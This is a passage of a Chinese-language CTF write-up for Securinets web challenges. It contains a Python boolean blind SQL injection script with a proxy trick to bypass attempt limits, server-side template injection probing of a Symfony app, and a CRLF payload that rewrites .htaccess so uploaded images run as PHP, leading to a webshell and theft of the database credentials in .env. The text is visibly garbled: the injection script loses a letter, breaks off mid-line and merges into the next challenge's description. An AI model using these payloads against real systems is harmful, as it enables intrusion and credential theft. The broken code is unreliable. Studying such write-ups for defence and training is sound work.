        $pass = generateRandomToken(100);
        $ip = $_SERVER['REMOTE_ADDR'];
        $sql = "INSERT INTO users (ip, token) VALUES (?,?)";
        $stmt = $pdo->prepare($sql);
        $stmt->execute([$ip, $pass]);
        }
    header("Location:play.php");
会话初始化的时候会生成一个随机100字符的token，但生成token的函数并没有给我们。
user表中存储了ip和token两个字段。
  * play.php
    Session Expired ! Please click  here ";
        die();
        }
    require_once ("task_bd.php");
    $currentValue = '';
    if (isset($_POST["val"]))
        {
        if ($_SESSION['count'] >= $max_count)
            {
            header("Location:reset.php");
            die();
            }
        $_SESSION['count']++;
        try
            {
            $sql = "SELECT * FROM users WHERE ip='" . $_SERVER['REMOTE_ADDR'] . "' AND token='" . $_POST['val'] . "'";
            $result = $conn->query($sql);
            if ($result)
                {
                $row = $result->fetch_assoc();
                }
              else
                {
                $row = false;
                }
            }
        catch(PDOException $e)
            {
            // echo $e;
            }
        if ($row)
            {
            echo "True";
            echo "Click here and use the token to get your flag";
            }
          else
            {
            echo "Better luck next time !";
            }
        $currentValue = $_POST['val'];
        }
    echo "Attempt: " . ($_SESSION['count']) . " / " . $max_count . "";
    ?>
很明显，这里有个注入
    $sql = "SELECT * FROM users WHERE ip='" . $_SERVER['REMOTE_ADDR'] . "' AND token='" . $_POST['val'] . "'";
这个查询完成后不会将查询的数据回显出来，而是会回答True或者False，也就是说，这是布尔盲注。
但这里有个限制，没查询一次，count就会+1，查询十次会话就会结束，新的token就会生成。
这里需要一个代理服务器，使用访问一下题目网站，建立session，记录代理服务器的IP地址，然后使用主机进行盲注注出代理服务器IP对应的Token，再使用代理服务器提交Token
盲注脚本如下
    mport requests
    url = "https://web4.ctfsecurinets.com/play.php"
    injection = "' OR (ip='Your Proxy IP' AND substring(token,%s,1)='%s') AND '1'='1"
    token = ''
    for i in range(1, 101):
      for b in 'abcdefghijklmnopqrstuvwxyz0123456789':
        requests.get(url.replace('play', 'reset'))
        s = requests.session()
        s.get(url.replace('play', 'index'))
        c = s.post(url, data={'val': injection % (i, b)}).content
        if b'>True N00B developers are an easy target. Try to exploit the application feature
> to get the hidden flag.
>
> Link: 
**Hint (pinned on Web channel from Discord):**
> Hint 1: Trading values: It's a server side task
>
> Hint 2: Trading values: change request values as a hacker
>
> Hint 3: Trading values: For the last part of the task: try to find another
> one. You don't know it but it's known by everyone
打开题目，显示一个动态的交易数据曲线图，打开开发者工具看一下
发现前端持续向后端发送了大量xhr类型的请求，URL如下
>
> [https://web1.ctfsecurinets.com/default?formula=KHYxLm1way12MS5kcmYqKHYxLm1way8wLjEpLXYxLmRyZikvKHYxLmF2ZyowLjgpLSh2Mi5hdmcvKCgxLzIpKnYyLm1kcy0yNC92Mi5kbXEqMTApKSsodjMucGRpLXYzLnBkaSszLzIqKDIvNSp2My5yYXIpLTY2KnYzLmdkcCkqNy41Lyh2NC5tdW0vdjQuZGFkKSo2LjUvdjQuYXZn&values%5Bv1%5D=STC&values%5Bv2%5D=PLA&values%5Bv3%5D=SDF&values%5Bv4%5D=OCK](https://web1.ctfsecurinets.com/default?formula=KHYxLm1way12MS5kcmYqKHYxLm1way8wLjEpLXYxLmRyZikvKHYxLmF2ZyowLjgpLSh2Mi5hdmcvKCgxLzIpKnYyLm1kcy0yNC92Mi5kbXEqMTApKSsodjMucGRpLXYzLnBkaSszLzIqKDIvNSp2My5yYXIpLTY2KnYzLmdkcCkqNy41Lyh2NC5tdW0vdjQuZGFkKSo2LjUvdjQuYXZn&values%5Bv1%5D=STC&values%5Bv2%5D=PLA&values%5Bv3%5D=SDF&values%5Bv4%5D=OCK)
变量如下
    formula: KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc=
    values[v1]: STC
    values[v2]: PLA
    values[v3]: SDF
    values[v4]: OCK
返回了一个浮点数159964.51282051
公式base64解密下得到
    (v1.mpk+v1.drf*(v1.mpk/0.5)-v1.drf)/(v1.avg*0.1)+(v2.avg*(v2.mds+v2.dmq))-(v3.pdi+v3.pdi+3/2*(v3.rar)-v3.gdp)+0.25*(v4.mum*v4.dad)*v4.avg
那么逻辑很简单，输入一个公式和四个变量然后计算出一个结果（公式中可以用变量）。
那么输入1+1会不会输出2呢，把`1+1`Base64编码一下`MSsx`
返回了2，有趣，那么再做如下测试，输入一个随机字符串看看会发生什么，Base64编码`jgkh`，`amdraA==`。
服务器把随机字符串当做变量，并试图输出这个变量，看起来像个服务器端模板注入。那么我想知道这是什么框架写的，访问`robots.txt`，返回404错误，将错误信息Google一下，发现是PHP的Symfony框架。
结合第三个hint，我输出v1，并将v1的值指向this
搜索得到Flag
### Unbreakable Uploader
> Find out the Mysql credentials and search the flag from the database.
>
> Link: 
**Hint (pinned on Web channel from Discord):**
> Hint 1 for Unbreakable Uploader: try Action deny, target all on the begining
长记性了，作者是不是喜欢Symfony框架啊，一上来先访问下`robots.txt`，果然又是。。。
打开题目，进入一个图片上传服务器，现在我们能上传图片文件，还能设置允许或拒绝目标的访问。
随意上传一个图片并访问，查看URL
>
> 
上传的图片被保存到了一个新生成的文件夹，图片也被重命名了。
尝试把自己的图片权限设置为Deny 0.0.0.0，也就是所有人都不能访问。
尝试访问，果然返回了403，不过也告诉我们这是个运行在Debian上的Apache服务器。
Apache服务器要实现权限控制一般要使用`.htaccess`文件，如果添加条件的过程是在读写`.htaccess`文件，那我们就可能通过控制`.htaccess`文件让Apache用php解析图片文件，比如写入如下内容
    AddType application/x-httpd-php .png
    AddHandler application/x-httpd-php .png
添加这样的配置以后，Apache处理`.png`文件时就会去调用PHP来解析。
要添加这样的配置，我们还需要一个CRLF注入，简单使用`%0d%0a`就OK
Payload
    0.0.0.0%0d%0aAddType%20application%2Fx-httpd-php%20.png%0d%0aAddHandler%20application%2Fx-httpd-php%20.png
重新打开图片，显示乱码，说明`.htaccess`文件生效
传个图片马上去
成功执行，这是Symfony框架，根据前几题的经验，我们知道数据库凭证保存在web根目录的`.env`文件中
使用中国蚁剑连接
注意这里要选择MYSQLI
得到flag